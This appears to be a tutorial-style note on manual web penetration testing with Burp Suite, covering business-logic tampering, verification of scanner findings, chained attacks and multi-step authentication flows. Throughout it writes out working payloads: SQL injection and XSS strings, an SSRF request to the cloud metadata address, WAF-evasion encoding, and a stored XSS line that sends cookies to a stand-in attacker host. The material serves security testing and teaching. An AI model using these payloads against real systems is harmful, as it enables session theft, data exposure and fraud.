## Manual (Burp) testing complements automation by:
- Catching logic flaws automation can’t detect (e.g., business logic, auth bypass).
- Validating false positives/negatives from automated scans.
- Letting you craft custom payloads & explore chained attacks.
- Useful where automation fails — like multi-step logins or CSRF-protected forms.

### In Details:
1) Logic flaws (automation misses)

Fund transfer tamper
Steps: POST /api/transfer body {"from":"A","to":"B","amount":100} → modify to to your account {"to":"attacker"} in Burp before sending.
Impact: money goes to attacker if server trusts client-supplied from or lacks server-side ownership check.

Refund replay
Steps: POST /api/refund with {"txId":"12345"} → replay same request twice in Repeater.
Impact: duplicate refunds if server doesn’t mark txId used.

Promo reuse
Steps: POST /api/cart/applyCoupon {"coupon":"WELCOME10","cartId":"C1"} → clone request, change cartId to C2 and resend.
Impact: same coupon applied to multiple carts if server doesn’t bind coupon to cart/user.



---

2) Verify scanner findings (false pos/neg)

SQLi check (time-based)
Scanner flagged search param. Repeater test: GET /products?name=abc' OR SLEEP(5)-- → if response slower → true blind SQLi.

XSS verify
Scanner flagged comments field. In browser (with Burp proxy) submit <img src=x onerror=alert(1)> and see if alert runs in the app UI.

Open redirect test
Scanner flagged /auth?returnUrl=. Try /auth?returnUrl=https://evil.com and observe actual redirect target.



---

3) Chained / custom payloads

SSRF → metadata leak
Find endpoint: GET /fetch?url=. Set url=http://169.254.169.254/latest/meta-data/ in Repeater. If returned → AWS metadata leak.

XSS → session steal
Inject stored XSS payload <script>new Image().src='https://attacker/?c='+document.cookie</script> into profile. Victim opens profile → cookie exfiltrated.

WAF evasion
WAF blocks union select. In Repeater try double-encoding: %75%6eion%20select and observe response differences.



---

4) Automation-hard flows (need Burp + browser)

SPA auth token capture
Flow: login via UI → token in JS Authorization header. Use Burp to capture auth token, then use Repeater with that header to access protected API /api/admin.

Multi-step signup → role escalation
Steps: signup /api/signup → email verify /api/verify?code= → then call /api/setRole — automation often stops at email; manual you follow email link and modify role param.

CSRF-protected action
Flow: browser GET /settings (gets cookie+token) → POST /settings/update requires X-CSRF-Token. Intercept full browser flow in Burp and replay with modified payload; missing token will fail — proves need for token.

---
